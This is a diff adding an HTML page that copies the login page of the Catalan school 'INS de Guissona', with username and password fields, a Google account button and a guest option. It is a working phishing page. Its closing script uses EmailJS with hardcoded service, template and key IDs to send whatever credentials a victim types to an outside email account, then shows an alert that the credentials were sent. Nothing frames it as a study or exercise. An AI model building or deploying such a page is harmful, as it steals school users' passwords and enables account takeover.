@@ -1,0 +1,208 @@
+<!DOCTYPE html>
+<html lang="ca">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Entrar a INS de Guissona</title>
+  <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
+  <link href="https://fonts.googleapis.com/css2?family=Roboto&display=swap" rel="stylesheet" />
+  <style>
+    * {
+      box-sizing: border-box;
+    }
+
+    body {
+      margin: 0;
+      font-family: 'Roboto', sans-serif;
+      background: linear-gradient(to bottom right, #f7f8f9, #e9ecef);
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+    }
+
+    .container {
+      background-color: #fff;
+      width: 100%;
+      max-width: 420px;
+      padding: 30px;
+      border-radius: 6px;
+      box-shadow: 0 2px 10px rgba(0, 0, 0, 0.08);
+    }
+
+    h2 {
+      margin-top: 0;
+      font-size: 20px;
+      text-align: center;
+      color: #333;
+    }
+
+    label {
+      display: block;
+      margin-bottom: 6px;
+      font-size: 14px;
+    }
+
+    input[type="text"],
+    input[type="password"] {
+      width: 100%;
+      padding: 10px;
+      margin-bottom: 15px;
+      border: 1px solid #ccc;
+      border-radius: 4px;
+      font-size: 14px;
+    }
+
+    button[type="submit"] {
+      width: 100%;
+      background-color: #dc3545;
+      color: white;
+      padding: 10px;
+      border: none;
+      border-radius: 4px;
+      font-weight: bold;
+      font-size: 14px;
+      cursor: pointer;
+      margin-bottom: 10px;
+    }
+
+    button[type="submit"]:hover {
+      background-color: #c82333;
+    }
+
+    .link {
+      text-align: left;
+      font-size: 13px;
+      color: #dc3545;
+      margin-bottom: 20px;
+    }
+
+    .divider {
+      border-top: 1px solid #ccc;
+      margin: 20px 0;
+    }
+
+    .section-label {
+      font-size: 14px;
+      color: #333;
+      margin-bottom: 10px;
+    }
+
+    .google-login {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      border: 1px solid #ccc;
+      padding: 8px;
+      border-radius: 4px;
+      cursor: pointer;
+      font-size: 14px;
+      background-color: white;
+      margin-bottom: 20px;
+    }
+
+    .google-login img {
+      height: 16px;
+      margin-right: 8px;
+    }
+
+    .guest-section {
+      font-size: 14px;
+      margin-bottom: 20px;
+      color: #333;
+    }
+
+    .guest-button {
+      background-color: #e2e6ea;
+      border: none;
+      padding: 8px 12px;
+      font-size: 14px;
+      border-radius: 4px;
+      cursor: pointer;
+    }
+
+    .footer {
+      text-align: center;
+      font-size: 12px;
+      color: #666;
+      border-top: 1px solid #eee;
+      padding-top: 15px;
+    }
+
+    .footer a {
+      margin-left: 8px;
+      text-decoration: none;
+      color: #444;
+      background: #f0f0f0;
+      padding: 4px 8px;
+      border-radius: 3px;
+      font-size: 12px;
+    }
+
+    .credits {
+      text-align: center;
+      font-size: 12px;
+      color: #888;
+      margin-top: 20px;
+      line-height: 1.5;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="container">
+    <h2>Entrar a INS de Guissona</h2>
+
+    <form id="loginForm">
+      <input type="text" name="usuari" placeholder="Nom d'usuari" required autocomplete="username" />
+      <input type="password" name="contrasenya" placeholder="Contrasenya" required autocomplete="current-password" />
+      <button type="submit">Accedir</button>
+    </form>
+
+    <div class="link">
+      Heu oblidat la contrasenya?
+    </div>
+
+    <div class="divider"></div>
+
+    <div class="section-label">Identifiqueu-vos usant el vostre compte a:</div>
+    <div class="google-login">
+      <img src="https://img.icons8.com/color/16/000000/google-logo.png" />
+      Google (@iesguissona.cat)
+    </div>
+
+    <div class="guest-section">
+      Alguns cursos permeten accedir a convidats
+      <br />
+      <button class="guest-button">Entrar com a persona convidada</button>
+    </div>
+
+    <div class="footer">
+      Espanyol - Internacional (és)
+      <a href="#">Avís de Cookies</a>
+    </div>
+
+    <div class="credits">
+      <br />
+      
+    </div>
+  </div>
+
+  <script>
+    emailjs.init("eXYLcXcMEURtAb1ii");
+
+    document.getElementById("loginForm").addEventListener("submit", function (e) {
+      e.preventDefault();
+      emailjs.sendForm("service_zbmzrhc", "template_fxnjdv1", this)
+        .then(() => {
+          alert("Credencials enviades correctament.");
+          this.reset();
+        }, (error) => {
+          console.error("Error:", error);
+          alert("Error en l'enviament. Comprova EmailJS.");
+        });
+    });
+  </script>
+
+</body>
+</html>
